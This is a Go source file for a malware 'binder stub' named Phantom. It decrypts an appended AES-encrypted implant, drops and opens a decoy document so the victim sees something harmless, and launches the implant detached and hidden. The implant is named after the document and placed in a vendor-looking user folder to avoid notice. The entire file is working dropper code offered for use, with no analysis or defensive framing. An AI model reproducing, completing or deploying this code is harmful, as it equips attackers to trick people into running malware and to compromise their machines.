// Phantom binder stub.
//
// One executable carries two blobs after its own image:
//
//	[stub image][sealed implant][decoy document][document name][footer]
//
// On launch it drops the decoy next to a copy of the implant, opens the decoy
// through ShellExecuteW (no cmd.exe hop) and starts the implant detached.
// Windows builds use -H windowsgui so nothing flashes on screen.
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

var magic = []byte("PHNTBINDv2______")

// footer: implantLen(4) docLen(4) nameLen(4) flags(4) key(32) nonce(12) magic(16)
const footerSize = 76

const (
	flagWait      = 1
	flagEncrypted = 2
)

func debugf(format string, a ...interface{}) {
	if os.Getenv("PHANTOM_DEBUG") == "" {
		return
	}
	fmt.Fprintf(os.Stderr, "[stub] "+format+"\n", a...)
}

func main() {
	self, err := os.Executable()
	if err != nil {
		return
	}
	blob, err := os.ReadFile(self)
	if err != nil || len(blob) < footerSize+2048 {
		debugf("short/read error: %v len=%d", err, len(blob))
		return
	}

	f := blob[len(blob)-footerSize:]
	if !bytes.Equal(f[60:76], magic) {
		debugf("no magic")
		return
	}
	implantLen := int(binary.LittleEndian.Uint32(f[0:4]))
	docLen := int(binary.LittleEndian.Uint32(f[4:8]))
	nameLen := int(binary.LittleEndian.Uint32(f[8:12]))
	flags := binary.LittleEndian.Uint32(f[12:16])
	key := f[16:48]
	nonce := f[48:60]

	nameOff := len(blob) - footerSize - nameLen
	docOff := nameOff - docLen
	impOff := docOff - implantLen
	if impOff < 0 || nameOff < 0 || docOff < 0 || nameOff+nameLen > len(blob) {
		debugf("bad offsets imp=%d doc=%d name=%d", implantLen, docLen, nameLen)
		return
	}

	name := sanitize(string(blob[nameOff : nameOff+nameLen]))
	doc := blob[docOff:nameOff]
	imp := blob[impOff:docOff]

	if flags&flagEncrypted != 0 {
		plain, err := unseal(imp, key, nonce)
		if err != nil {
			debugf("unseal: %v", err)
			return
		}
		imp = plain
	}

	dir := workDir(name)
	if err := os.MkdirAll(dir, 0755); err != nil {
		debugf("mkdir %s: %v", dir, err)
	}
	debugf("workdir=%s doc=%s", dir, name)

	if docLen > 0 {
		docPath := filepath.Join(dir, name)
		if err := os.WriteFile(docPath, doc, 0644); err == nil {
			debugf("opening decoy")
			openPath(docPath)
			if flags&flagWait != 0 {
				time.Sleep(1800 * time.Millisecond) // viewer comes up first
			}
		} else {
			debugf("write decoy: %v", err)
		}
	}

	runImplant(imp, dir, name)
}

func unseal(blob, key, nonce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(nonce) != gcm.NonceSize() {
		return nil, fmt.Errorf("bad nonce")
	}
	return gcm.Open(nil, nonce, blob, nil)
}

func sanitize(n string) string {
	n = strings.TrimSpace(n)
	n = strings.ReplaceAll(n, "/", "_")
	n = strings.ReplaceAll(n, "\\", "_")
	n = strings.ReplaceAll(n, ":", "_")
	if n == "" || n == "." || n == ".." {
		n = "document.pdf"
	}
	return n
}

// workDir keeps the dropped files in a vendor-looking per-user location instead
// of the crowded %TEMP% root.
func workDir(docName string) string {
	product := strings.TrimSuffix(docName, filepath.Ext(docName))
	product = strings.Map(func(r rune) rune {
		if r == '.' || r == ' ' || r == '_' {
			return -1
		}
		return r
	}, product)
	if product == "" {
		product = "Updater"
	}
	if runtime.GOOS == "windows" {
		base := os.Getenv("LOCALAPPDATA")
		if base == "" {
			base = os.TempDir()
		}
		return filepath.Join(base, product)
	}
	if runtime.GOOS == "darwin" {
		if h, err := os.UserHomeDir(); err == nil {
			return filepath.Join(h, "Library", "Caches", product)
		}
	}
	if h, err := os.UserHomeDir(); err == nil {
		return filepath.Join(h, ".cache", product)
	}
	return filepath.Join(os.TempDir(), product)
}

func openPath(p string) {
	switch runtime.GOOS {
	case "windows":
		if err := shellOpen(p); err == nil {
			return
		}
		// fallback without shell32
		c := exec.Command("rundll32", "url.dll,FileProtocolHandler", p)
		detach(c)
		c.Start()
	case "darwin":
		start("open", p)
	default:
		for _, opener := range [][]string{
			{"xdg-open", p},
			{"gio", "open", p},
			{"kde-open5", p},
			{"kde-open", p},
		} {
			if err := start(opener[0], opener[1:]...); err == nil {
				return
			}
		}
	}
}

func start(name string, args ...string) error {
	c := exec.Command(name, args...)
	detach(c)
	return c.Start()
}

// runImplant drops the implant beside the decoy and starts it detached. It is
// named after the document so the file pair looks natural.
func runImplant(blob []byte, dir, docName string) {
	if len(blob) == 0 {
		return
	}
	stem := strings.TrimSuffix(docName, filepath.Ext(docName))
	if stem == "" {
		stem = "svc"
	}
	name := stem
	if runtime.GOOS == "windows" {
		name += ".exe"
	}
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, blob, 0755); err != nil {
		debugf("write implant: %v", err)
		return
	}
	_ = os.Chmod(p, 0755)
	c := exec.Command(p)
	detach(c)
	c.Dir = dir
	if err := c.Start(); err != nil {
		debugf("start implant: %v", err)
		return
	}
	debugf("implant started")
	if runtime.GOOS != "windows" {
		time.Sleep(200 * time.Millisecond)
	}
}

